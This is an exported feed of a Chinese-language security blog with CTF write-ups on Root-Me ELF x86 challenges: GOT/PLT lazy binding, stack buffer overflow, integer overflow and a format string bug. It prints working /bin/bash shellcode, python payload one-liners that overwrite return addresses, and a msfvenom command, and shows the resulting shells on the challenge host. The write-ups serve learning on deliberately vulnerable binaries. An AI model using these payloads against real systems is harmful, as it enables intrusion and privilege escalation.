0x8049026                              jmp    dword ptr [0x804c008] &lt;_dl_runtime_resolve&gt;</p><pre><code>pwndbg&gt; x/2xw 0x804c0040x804c004:    0xf7ffd980    0xf7fe9730</code></pre><p>第一个在连接器数据段是<code>link_map地址</code>，第二个在连接器执行代码处是<code>_dl_runtime_resolve地址</code><br>plt开头两个是来第一次运行时查地址的</p><p>因此, 实际上(第一次)调用puts@plt就相当于调用了<br><code>_dl_runtime_resolve((link_map *)m, 0)!</code> 其中link_map提供了运行时的必要信息,<br>而0则是puts函数的偏移<code>(在puts@plt中push 0x0)</code>.</p><p>resolve执行完后：：<br>    pwndbg&gt; disass ‘puts@plt’<br>    Dump of assembler code for function puts@plt:<br>       0x08049030 &lt;+0&gt;:    jmp    DWORD PTR ds:0x804c00c<br>       0x08049036 &lt;+6&gt;:    push   0x0<br>       0x0804903b &lt;+11&gt;:    jmp    0x8049020<br>    End of assembler dump.</p><pre><code>pwndbg&gt; x/wx 0x804c00c0x804c00c &lt;puts@got.plt&gt;:    0xf7e303c0pwndbg&gt; info symbol 0xf7e303c0puts in section .text of /lib/i386-linux-gnu/libc.so.6</code></pre><p>找到puts的代码地址</p><h3 id="攻击防御"><a href="#攻击防御" class="headerlink" title="攻击防御"></a>攻击防御</h3><p>防止写got.plt表<br><code>Enter relocations read-only, or RELRO.</code></p><p>a strategy was developed to allow looking up all of these addresses when the program was run and providing a mechanism to call these functions from libraries. This is known as relocation</p><h3 id="got"><a href="#got" class="headerlink" title=".got"></a>.got</h3><p>This is the GOT, or Global Offset Table. This is the <code>actual table of offsets </code>as filled in by the linker for external symbols.<br>.plt<br>This is the PLT, or Procedure Linkage Table. These are stubs that look up the addresses in the .got.plt section, and either jump to the right address, or trigger the code in the linker to look up the address. (If the address has not been filled in to .got.plt yet.)<br>.got.plt<br>This is the GOT for the PLT. It contains the<code>target addresses</code>(after they have been looked up) or an address back in the .plt to trigger the lookup. Classically, this data was part of the .got section</p><p>.GOT 开头包含实际地址，.plt开头是要跳转到目标<br>pwndbg&gt; x/i $pc<br>=&gt; 0x804845f &lt;main+36&gt;:    call   0x8048300 &lt;puts@plt&gt;</p><p>.got.plt表内容<br>got0: 本ELF动态段(.dynamic段)的装载地址<br>got1: 本ELF的link_map数据结构描述符地址<br>got2: _dl_runtime_resolve函数的地址<br><a href="https://ropemporium.com/image/example_gotplt_section.png"><img src="https://ropemporium.com/image/example_gotplt_section.png"></a></p><hr><h2 id="x86-get-pc-thunk-ax"><a href="#x86-get-pc-thunk-ax" class="headerlink" title="__x86.get_pc_thunk.ax"></a>__x86.get_pc_thunk.ax</h2><p>objdump -d main_pi | grep “__x86.get_pc_thunk.ax” -A 2<br>000006ad &lt;__x86.get_pc_thunk.ax&gt;:<br> 6ad:    8b 04 24                 mov    eax,DWORD PTR [esp]<br> 6b0:    c3                       ret<br>作用就是把esp(即返回地址)的值保存在eax(PIC寄存器)中, 在接下来寻址用<br>详见<a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html">https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html</a></p><h2 id="CTF-WIKI-ROP"><a href="#CTF-WIKI-ROP" class="headerlink" title="CTF-WIKI ROP"></a>CTF-WIKI ROP</h2><p><a href="https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/">https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/</a><br>ROP</p><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p><code>gdb vmmap </code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;简单的ROP学习，没有开启PIE&lt;/p&gt;
&lt;h2 id=&quot;Bypassing-NX-bit-using-chained-return-to-libc&quot;&gt;&lt;a href=&quot;#Bypassing-NX-bit-using-chained-return-to-libc&quot; class=&quot;headerlink&quot; title=&quot;Bypassing NX bit using chained return-to-libc&quot;&gt;&lt;/a&gt;Bypassing NX bit using chained return-to-libc&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/&quot;&gt;https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;system address + exit address + system+args&lt;br&gt;exit相当于下一步地址，因为不是调用call, 不会压入下一步地址&lt;/p&gt;</summary>
    
    
    
    <category term="rop_emporium" scheme="http://finsenty54.github.io/categories/rop-emporium/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Stack buffer overflow basic 5</title>
    <link href="http://finsenty54.github.io/2021/01/08/Stack_buffer_overflow_basic_5/"/>
    <id>http://finsenty54.github.io/2021/01/08/Stack_buffer_overflow_basic_5/</id>
    <published>2021-01-08T05:34:58.000Z</published>
    <updated>2021-01-08T05:35:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>ELF x86 - Stack buffer overflow basic 5</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(fgets(buff, BUFFER, file) != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    chomp(buff);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strncmp</span>(buff, <span class="string">&quot;USERNAME=&quot;</span>, <span class="number">9</span>) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        cpstr(init.username, buff+<span class="number">9</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">fclose(file);</span><br><span class="line"><span class="keyword">return</span> init;</span><br></pre></td></tr></table></figure><a id="more"></a><p>数据读入buffer，<code>ebp-0x2a5</code>， 只能读512字符+’\n’。不能到EIP，但这段代码赋值到init，没有检查边界，init起始地址<code>ebp-0xa4 </code>，比较小好溢出。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>函数最后，会将本地变量init赋值到外部init所在地址，位于<code>$ebp+0x8</code>，值为<code>0xbffffb00</code>，因为buff最后’\n’变为’\00’，为了能够执行，shellcode最后还要加上<code>$ebp+0x8</code>，此时刚好有个’00’，所以不用加地址也能运行，但最后还是段错误。<br><a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%205">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%205</a><br>最后用到这篇的方法：<br><a href="https://finsenty54.github.io/2020/12/29/stack_buffer_overflow_basic_4/">https://finsenty54.github.io/2020/12/29/stack_buffer_overflow_basic_4/</a></p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><ol><li><code>wget https://raw.githubusercontent.com/Finsenty54/-python/master/findenv.c</code></li><li><code>gcc -o findenv findenv.c</code></li><li><code>export JUNK=(python -c &quot;print &#39;B&#39; * 1000&quot;)</code></li><li><code>export SHELCODE=(python -c &#39;print(&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&quot;)&#39;)</code></li><li><code>/tmp/findenv JUNK ./ch10</code><br>JUNK will be at 0xbffffac2</li><li><code>/tmp/findenv SHELCODE ./ch10</code><br>SHELCODE will be at 0xbfffff4d</li><li><code>(python -c &quot;print &#39;USERNAME=&#39;+&#39;\x90&#39;*136+&#39;\x60\xb1\x04\x08&#39;+&#39;A&#39;*28+&#39;\x4d\xff\xff\xbf&#39;+&#39;\xc2\xfa\xff\xbf&#39;&quot;) &gt; /var/tmp/data.txt</code></li></ol><pre><code>app-systeme-ch10@challenge02:~$ ./ch10 /var/tmp/data.txtbash-4.4$ iduid=1110(app-systeme-ch10) gid=1110(app-systeme-ch10) euid=1210(app-systeme-ch10-cracked) groups=1110(app-systeme-ch10),100(users)bash-4.4$ cat .passwd</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;ELF x86 - Stack buffer overflow basic 5&lt;/p&gt;
&lt;h2 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h2&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(fgets(buff, BUFFER, file) != &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    chomp(buff);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(buff, &lt;span class=&quot;string&quot;&gt;&amp;quot;USERNAME=&amp;quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;) == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        cpstr(init.username, buff+&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;fclose(file);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; init;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Stack buffer and integer overflow</title>
    <link href="http://finsenty54.github.io/2021/01/07/Stack_buffer_and_integer_overflow/"/>
    <id>http://finsenty54.github.io/2021/01/07/Stack_buffer_and_integer_overflow/</id>
    <published>2021-01-07T08:30:11.000Z</published>
    <updated>2021-01-07T08:31:09.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ELF-x86-Stack-buffer-and-integer-overflow"><a href="#ELF-x86-Stack-buffer-and-integer-overflow" class="headerlink" title="ELF x86 - Stack buffer and integer overflow"></a>ELF x86 - Stack buffer and integer overflow</h1><p>永远的神：：<a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20and%20integer%20overflow">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20and%20integer%20overflow</a></p><h2 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h2><p>为了让shell更实用<br>覆盖<code>EIP</code>, 使用现有的命令的地址，例如<code>jmp esp</code> ， 跳转buffer ， 后面是shellcode</p><h3 id="查找jmp-call-esp地址"><a href="#查找jmp-call-esp地址" class="headerlink" title="查找jmp/call esp地址"></a>查找jmp/call esp地址</h3><ol><li>可以在共享库中找</li><li>也可以在自身程序找命令<a id="more"></a><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$objdump -d vulnerable_1 | grep <span class="string">&quot;eax&quot;</span></span><br><span class="line"><span class="number">1019</span>:ff d0                call   *%eax</span><br></pre></td></tr></table></figure>或者启动<code>metasploit-framework</code><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; msfelfscan -j eax vulnerable_1</span><br><span class="line">[*] exec: msfelfscan -j eax vulnerable_1</span><br><span class="line">[vulnerable_1]</span><br><span class="line"><span class="number">0x00002019</span> call eax</span><br><span class="line"><span class="number">0x000020dc</span> call eax</span><br><span class="line"><span class="number">0x0000302f</span> call eax</span><br><span class="line"><span class="number">0x00002019</span> call eax</span><br><span class="line"><span class="number">0x000020dc</span> call eax</span><br><span class="line"><span class="number">0x0000302f</span> call eax</span><br><span class="line"><span class="number">0x0000302f</span> call eax</span><br></pre></td></tr></table></figure>“jmp/call eax”都行<br>use linux/x86/exec<h3 id="用msfvenom生成payload"><a href="#用msfvenom生成payload" class="headerlink" title="用msfvenom生成payload"></a>用msfvenom生成payload</h3><code>Msfvenom</code> 在 2015 年 6 月 8 日已经替代了 msfpayload 与 msfenocde 命令，它是这两个命令的结合体。<br><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom">https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom</a><br><code>msfvenom -p linux/x86/exec CMD=dash R -a x86 -e x86/alpha_mixed -b &quot;\x00\x0a\x0d&quot; -f python </code></li></ol><hr><h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p><a href="https://sploitfun.wordpress.com/2015/06/23/integer-overflow/">https://sploitfun.wordpress.com/2015/06/23/integer-overflow/</a></p><p>Storing<code>a value greater</code>than <code>maximum supported value</code> is called integer overflow.  an integer overflow might <code>lead to stack overflow or heap overflow</code> which could result in arbitrary code execution.<br>对数组长度检查失效</p><p>Similarly storing a value lesser than the minimum supported value is called integer underflow.</p><p><code> 261</code> gets wrapped around and stored as 5 in ‘passwd_len’ variable<br><code>000100000101 取8位 为5</code></p><hr><h2 id="本题"><a href="#本题" class="headerlink" title="本题"></a>本题</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER 128</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_file</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> path[BUFFER+<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">int</span> size;  </span><br><span class="line">   </span><br><span class="line">  <span class="keyword">if</span>(read(fd, &amp;size, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)) != <span class="keyword">sizeof</span>(<span class="keyword">int</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] File too short.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">if</span>(size &gt;= BUFFER)  <span class="comment">//绕过检查</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Path too long.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  read_data(path, fd, size);</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">if</span>(path[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Need a absolute path.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] The pathname is : %s\n&quot;</span>, path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="read-命令"><a href="#read-命令" class="headerlink" title="read 命令"></a>read 命令</h3><p>ssize_t read(int fd, void *buf, size_t count);<br>read() attempts to <strong>read up to count bytes **from file descriptor fd into the</strong> buffer starting at buf**.</p><p> On success, the <code>number of bytes read is returned</code> (zero indicates end of file), and the file position is <strong>advanced by this number.</strong></p><hr><h3 id="有符号数补码"><a href="#有符号数补码" class="headerlink" title="有符号数补码"></a>有符号数补码</h3><p>Because it’s a <code>signed int</code> variable, <code>0xffffffff equals to -1</code>.</p><p>《深入理解计算机系统》中<br>有符号数整数表示:<br>1011=<code>-1*2^3+0*2^2+1*2^1+1*2^0</code>=-5<br>1000=-8<br> 0111=7<br>1111=-1<br>所以<code>0xffffffff=-0x800000+0x7fffffff=-1</code></p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>简单逆向后，就知道多少能到EIP</p><p><code>(python -c &quot;print &#39;\xff&#39;*4+&#39;/&#39;+&#39;A&#39;*156+&#39;B&#39;*4)</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Stopped reason: SIGSEGV</span><br><span class="line"><span class="number">0x42424242</span> in ?? ()</span><br></pre></td></tr></table></figure><h3 id="gdb内外地址是不同的"><a href="#gdb内外地址是不同的" class="headerlink" title="gdb内外地址是不同的"></a>gdb内外地址是不同的</h3><p>shellcode 放在0xbffffa60<br>‘\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80’ 33长</p><p>(python -c “print ‘\xff’*4+’/‘+’A’*156+’0xbffffa60’[::-1]) &gt; /tmp/data.txt<br>但是还是段错误</p><p>It happens because the <code>addresses are different</code> between inside and outside of gdb (someone told me it’s because the additional environment variables gdb sets).</p><p>So to come around it, and find the actual address of the shellcode outside gdb, one can use the<code> -e switch of the strace tool</code>.<br>The -e switch enables one to set an expression which will affect the tool’s output. For example, for seeing the <code>second argument of read as an address instead of the string.</code></p><p><code>$strace -e raw=read ./ch11 /tmp/data.txt</code><br>重新设置shellcode地址</p><pre><code>app-systeme-ch11@challenge02:~$ ./ch11 /tmp/data.txt[+] The pathname is : /j                        X™Rfh-p‰áRjhh/bash/bin‰ãRQS‰á ̀                  °úÿ¿bash-4.4$ iduid=1111(app-systeme-ch11) gid=1111(app-systeme-ch11) euid=1211(app-systeme-ch11-cracked) groups=1111(app-systeme-ch11),100(users)</code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ELF-x86-Stack-buffer-and-integer-overflow&quot;&gt;&lt;a href=&quot;#ELF-x86-Stack-buffer-and-integer-overflow&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - Stack buffer and integer overflow&quot;&gt;&lt;/a&gt;ELF x86 - Stack buffer and integer overflow&lt;/h1&gt;&lt;p&gt;永远的神：：&lt;a href=&quot;https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20and%20integer%20overflow&quot;&gt;https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20and%20integer%20overflow&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;ret2reg&quot;&gt;&lt;a href=&quot;#ret2reg&quot; class=&quot;headerlink&quot; title=&quot;ret2reg&quot;&gt;&lt;/a&gt;ret2reg&lt;/h2&gt;&lt;p&gt;为了让shell更实用&lt;br&gt;覆盖&lt;code&gt;EIP&lt;/code&gt;, 使用现有的命令的地址，例如&lt;code&gt;jmp esp&lt;/code&gt; ， 跳转buffer ， 后面是shellcode&lt;/p&gt;
&lt;h3 id=&quot;查找jmp-call-esp地址&quot;&gt;&lt;a href=&quot;#查找jmp-call-esp地址&quot; class=&quot;headerlink&quot; title=&quot;查找jmp/call esp地址&quot;&gt;&lt;/a&gt;查找jmp/call esp地址&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;可以在共享库中找&lt;/li&gt;
&lt;li&gt;也可以在自身程序找命令</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ELF x86 - Format String Bug Basic 3</title>
    <link href="http://finsenty54.github.io/2021/01/03/Format_String_Bug_Basic_3/"/>
    <id>http://finsenty54.github.io/2021/01/03/Format_String_Bug_Basic_3/</id>
    <published>2021-01-03T02:34:05.000Z</published>
    <updated>2021-01-07T09:15:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ELF-x86-Format-String-Bug-Basic-3"><a href="#ELF-x86-Format-String-Bug-Basic-3" class="headerlink" title="ELF x86 - Format String Bug Basic 3"></a>ELF x86 - Format String Bug Basic 3</h1><a id="more"></a><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// char    log_file = &quot;/var/log/bin_error.log&quot;;</span></span><br><span class="line">    <span class="keyword">char</span>    outbuf[<span class="number">512</span>];</span><br><span class="line">    <span class="keyword">char</span>    buffer[<span class="number">512</span>];</span><br><span class="line">    <span class="keyword">char</span>    user[<span class="number">12</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> *username = <span class="string">&quot;root-me&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// FILE *fp_log = fopen(log_file, &quot;a&quot;);</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Username: &quot;</span>);</span><br><span class="line">    fgets(user, <span class="keyword">sizeof</span>(user), <span class="built_in">stdin</span>);</span><br><span class="line">    user[<span class="built_in">strlen</span>(user) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(user, username)) &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">sprintf</span> (buffer, <span class="string">&quot;ERR Wrong user: %400s&quot;</span>, user);</span><br><span class="line">        <span class="built_in">sprintf</span> (outbuf, buffer);</span><br><span class="line">        <span class="comment">// fprintf (fp_log, &quot;%s\n&quot;, outbuf);</span></span><br><span class="line">   </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Bad username: %s\n&quot;</span>, user);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello %s ! How are you ?\n&quot;</span>, user);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// fclose(fp_log);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="大体思路"><a href="#大体思路" class="headerlink" title="大体思路"></a>大体思路</h2><ol><li>shellcode 放在环境变量中</li><li>溢出，控制EIP，指向shellcode</li></ol><h3 id="snprintf-amp-sprintf"><a href="#snprintf-amp-sprintf" class="headerlink" title="snprintf &amp; sprintf"></a>snprintf &amp; sprintf</h3><pre><code>int snprintf(char *restrict s, size_t n,       const char *restrict format, ...);int sprintf(char *restrict s, const char *restrict format, ...);</code></pre><p>后面跟着format</p><p>字符串漏洞 overwrite the GOT entry</p><p><code>$ ulimit -s unlimited </code>关闭ASLR</p><hr><p>可以指定宽度，不足的左边补空格：<br>    sprintf(s, “%8d%8d”, 123, 4567); //产生：” 123 4567”</p><hr><h3 id="得到段错误"><a href="#得到段错误" class="headerlink" title="得到段错误"></a>得到段错误</h3><p><code>char *s1 @ ebp-0x414 </code> 输入放在这里</p><p>push ebp<br>此时esp 指向ebp内的值</p><p><code>0x804858b &lt;main+133&gt;:        lea    eax,[ebp-0x408]</code><br>存放buffer</p><pre><code>gdb-peda$ x/1s $ebp-0x4080xbffff730:     &quot;ERR Wrong user:&quot;, &#39; &#39; &lt;repeats 185 times&gt;...</code></pre><p><code>0x80485a1 &lt;main+155&gt;:        lea    eax,[ebp-0x208]</code><br>存放outbuffer</p><pre><code>gdb-peda$ x/100s $ebp+0x2000xbffffe01:     &quot;SHELLCODE=j\vX\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341\315\200&quot;</code></pre><p>Then buffer is set to ERR Wrong user: &lt;400-9 whitespaces&gt;%200xAAAA<br>ERR Wrong user:  长度是16</p><p> outbuf is set to ERR Wrong user: &lt;400-9 whitespaces&gt;&lt;200 bytes&gt;AAAA</p><p>576 space +7 =583 个space  + 8字节 + AAAA<br>因为%x打印8个数，然后再存的话就是8字节<br>gdb-peda$ x/1s $ebp<br>0xbffffb18:     ‘ ‘ &lt;repeats 79 times&gt;, “30303225AAAA”</p><p>那么<br>113 覆盖ebp的位置<br>EBP: 0xbffffb18 (“aaaa”)</p><p>%117xaaaa<br>执行leave后，esp指向aaaa<br>EIP: 0x61616161 (‘aaaa’)</p><p>shellcode</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export SHELLCODE=`python -c 